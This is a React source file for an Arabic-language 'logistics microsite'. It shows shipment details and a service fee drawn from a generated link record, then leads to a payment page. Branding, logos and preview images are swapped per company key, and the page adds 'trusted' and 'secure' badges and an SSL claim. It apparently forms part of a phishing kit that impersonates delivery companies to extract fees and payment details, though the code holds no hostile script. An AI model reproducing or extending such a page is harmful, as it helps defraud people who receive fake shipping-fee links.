import React from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Card } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useLink } from "@/hooks/useSupabase";
import { getCountryByCode, formatCurrency } from "@/lib/countries";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getCompanyMeta } from "@/utils/companyMeta";
import { getCurrency } from "@/utils/countryData";
import { getPaymentData } from "@/utils/paymentData";
import SEOHead from "@/components/SEOHead";
import {
  Truck,
  CheckCircle2,
  Shield,
  Package,
  MapPin,
  User,
  Hash,
  DollarSign,
} from "lucide-react";

const LogisticsMicrosite = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { data: link, isLoading } = useLink(id);
  
  if (isLoading) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="animate-pulse text-xl">جاري التحميل...</div>
      </div>
    );
  }
  
  if (!link) {
    return (
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-center">
          <h2 className="text-2xl font-bold mb-2">الرابط غير موجود</h2>
          <p className="text-muted-foreground">الرجاء التحقق من الرابط</p>
        </div>
      </div>
    );
  }
  
  const payload = link.payload;
  const countryCode = link.country_code || payload?.selectedCountry || "SA";
  const countryData = getCountryByCode(countryCode);

  const paymentInfo = getPaymentData(link);
  const amount = paymentInfo.amount;
  
  const serviceKey = payload?.service_key || 'warehouse';
  const serviceBranding = getServiceBranding(serviceKey);
  const companyMeta = getCompanyMeta(serviceKey);

  const logisticsTheme = {
    primary: serviceBranding.colors.primary,
    secondary: serviceBranding.colors.secondary,
    gradient: serviceBranding.gradients?.primary || `linear-gradient(135deg, ${serviceBranding.colors.primary}, ${serviceBranding.colors.secondary})`,
    bgLight: "#f5f3ff"
  };

  const handleProceedToPayment = () => {
    navigate(`/pay/${id}/recipient?company=${serviceKey}&currency=${countryData?.currency || 'SAR'}`);
  };

  return (
    <>
      <SEOHead
        title={`خدمة لوجستية - ${payload?.service_name || 'شحن'}`}
        description={`خدمة ${payload?.service_name || 'لوجستية'} احترافية - نظام دفع آمن`}
        ogImage={serviceBranding.ogImage}
        company={serviceKey}
      />
      
      <div className="min-h-screen py-8" dir="rtl" style={{ background: `linear-gradient(to bottom, ${logisticsTheme.bgLight}, white)` }}>
        <div className="container mx-auto px-4 max-w-2xl">
          <Card className="overflow-hidden shadow-2xl border-2" style={{ borderColor: `${logisticsTheme.primary}30` }}>
            <div
              className="h-32 relative"
              style={{ background: logisticsTheme.gradient }}
            >
              <div className="absolute inset-0 bg-black/10" />
              <div className="absolute inset-0 flex flex-col items-center justify-center text-white">
                <Truck className="w-12 h-12 mb-2" />
                <h1 className="text-2xl font-bold">خدمة لوجستية</h1>
                <p className="text-sm opacity-90">حلول شحن ونقل متقدمة</p>
              </div>
            </div>

            <div className="p-6 space-y-6">
              <div className="flex items-center gap-2 justify-center">
                <Badge className="text-xs px-3 py-1" style={{ background: `${logisticsTheme.primary}20`, color: logisticsTheme.primary }}>
                  <CheckCircle2 className="w-3 h-3 ml-1" />
                  موثوق
                </Badge>
                <Badge className="text-xs px-3 py-1" style={{ background: `${logisticsTheme.primary}20`, color: logisticsTheme.primary }}>
                  <Shield className="w-3 h-3 ml-1" />
                  آمن
                </Badge>
              </div>

              <div className="space-y-4">
                <div className="p-5 rounded-xl" style={{ background: logisticsTheme.bgLight }}>
                  <div className="space-y-3">
                    {payload?.service_name && (
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-muted-foreground flex items-center gap-2">
                          <Package className="w-4 h-4" />
                          نوع الخدمة:
                        </span>
                        <span className="font-bold text-base">{payload.service_name}</span>
                      </div>
                    )}

                    {payload?.shipment_number && (
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-muted-foreground flex items-center gap-2">
                          <Hash className="w-4 h-4" />
                          رقم الشحنة:
                        </span>
                        <span className="font-semibold text-sm">{payload.shipment_number}</span>
                      </div>
                    )}
                    
                    {payload?.client_name && (
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-muted-foreground flex items-center gap-2">
                          <User className="w-4 h-4" />
                          اسم العميل:
                        </span>
                        <span className="font-semibold text-sm">{payload.client_name}</span>
                      </div>
                    )}

                    {payload?.origin && (
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-muted-foreground flex items-center gap-2">
                          <MapPin className="w-4 h-4" />
                          من:
                        </span>
                        <span className="font-semibold text-sm">{payload.origin}</span>
                      </div>
                    )}

                    {payload?.destination && (
                      <div className="flex items-center justify-between">
                        <span className="text-sm text-muted-foreground flex items-center gap-2">
                          <MapPin className="w-4 h-4" />
                          إلى:
                        </span>
                        <span className="font-semibold text-sm">{payload.destination}</span>
                      </div>
                    )}

                    {payload?.cargo_description && (
                      <div className="pt-2">
                        <span className="text-xs text-muted-foreground">وصف البضاعة:</span>
                        <p className="text-sm mt-1">{payload.cargo_description}</p>
                      </div>
                    )}

                    {payload?.service_notes && (
                      <div className="pt-2">
                        <span className="text-xs text-muted-foreground">ملاحظات:</span>
                        <p className="text-sm mt-1">{payload.service_notes}</p>
                      </div>
                    )}
                    
                    <div className="flex items-center justify-between pt-3 border-t" style={{ borderColor: `${logisticsTheme.primary}20` }}>
                      <span className="text-sm text-muted-foreground flex items-center gap-2">
                        <DollarSign className="w-4 h-4" />
                        رسوم الخدمة:
                      </span>
                      <span className="font-bold text-2xl" style={{ color: logisticsTheme.primary }}>
                        {formatCurrency(amount, countryData?.currency || 'SAR')}
                      </span>
                    </div>
                  </div>
                </div>

                <div className="flex items-center gap-2 text-xs text-muted-foreground justify-center">
                  <Shield className="w-4 h-4" style={{ color: logisticsTheme.primary }} />
                  <span>جميع المعاملات محمية بتشفير SSL</span>
                </div>

                <Button
                  onClick={handleProceedToPayment}
                  className="w-full py-7 text-lg font-bold shadow-xl hover:shadow-2xl transition-all text-white"
                  style={{ background: logisticsTheme.gradient }}
                >
                  <Truck className="w-5 h-5 ml-2" />
                  <span>سداد الرسوم والمتابعة</span>
                </Button>

                <div className="pt-4 border-t text-center space-y-2">
                  <p className="text-xs text-muted-foreground">
                    🚚 خدمات لوجستية احترافية - شحن آمن وموثوق
                  </p>
                </div>
              </div>
            </div>
          </Card>
        </div>
      </div>
    </>
  );
};

export default LogisticsMicrosite;
